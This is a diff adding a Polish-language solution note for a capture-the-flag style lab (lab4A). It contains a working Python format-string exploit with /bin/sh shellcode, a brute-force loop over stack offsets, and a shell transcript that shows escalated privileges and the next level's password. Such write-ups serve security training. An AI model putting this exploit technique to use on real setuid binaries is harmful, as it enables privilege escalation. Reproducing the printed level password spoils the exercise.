@@ -1,0 +1,61 @@
+trzeba zrobic plik:
+/tmp/backups/.log
+przejsc do /tmp
+i tam odpalać:
+/levels/lab04/lab4A
+i tail -f /tmp/backups/.log
+
+---- EXPLOIT --- :
+import struct
+import sys
+
+nopy = "\x90"*2
+shellcode = nopy+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+pattern=int(sys.argv[1],16)
+
+return_address=0xbffff61c-pattern #0xbffff64c
+buffer_address=0xbffff51f-pattern # 0xbffff54f
+
+payload = ""
+payload += shellcode
+payload += struct.pack("<L",return_address+2)
+payload += struct.pack("<L",return_address)
+payload += "%"
+payload += str(((buffer_address >> 16) - (len(shellcode)+8)))
+# payload += str(((buffer_address >> 16) - 25+8))
+payload += "x"
+
+pierwsza=20
+druga=pierwsza+1
+
+payload += "%"+str(pierwsza)+"$hn%"
+payload += str((buffer_address & 0xffff)-(buffer_address >> 16))
+payload += "x%"+str(druga)+"$hn"
+
+sys.stdout.write(payload)
+
+----------------------------------------------------------------
+Kwestia dobrania odpowiednich return/buffer address i pozniej odpalenie:
+
+for i in {0..128}; do /levels/lab04/lab4A $(python /tmp/exploit.py $i); done
+
+$ id
+uid=1016(lab4A) gid=1017(lab4A) euid=1017(lab4end) groups=1018(lab4end),1001(gameuser),1017(lab4A)
+$ cd /home/
+$ ls
+gameadmin  lab2B    lab3end  lab5B    lab6end  lab8C	lecture_priv
+lab1A	   lab2C    lab4A    lab5C    lab7A    lab8end	project1
+lab1B	   lab2end  lab4B    lab5end  lab7C    lab9A	project1_priv
+lab1C	   lab3A    lab4C    lab6A    lab7end  lab9C	project2
+lab1end    lab3B    lab4end  lab6B    lab8A    lab9end	project2_priv
+lab2A	   lab3C    lab5A    lab6C    lab8B    lecture
+$ cd lab4end
+$ ls
+$ cat .pass
+1t_w4s_ju5t_4_w4rn1ng
+$
+
+
+Przed wywołaniem snprintf -> stack to jest buffer_address
+A ret: to jest return adress
